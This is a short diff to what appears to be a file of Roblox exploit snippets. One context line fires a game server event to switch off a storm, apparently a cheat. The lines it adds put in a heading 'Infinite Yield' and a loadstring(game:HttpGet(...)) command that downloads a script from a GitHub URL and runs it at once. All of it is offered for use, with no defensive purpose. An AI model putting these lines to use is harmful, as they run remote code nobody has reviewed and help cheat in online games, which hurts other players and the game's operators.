@@ -20,4 +20,6 @@ game:GetService("ReplicatedStorage").StormDisable:FireServer()
 
 
 
-# Exploit santa is coming
+# Infinite Yield
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
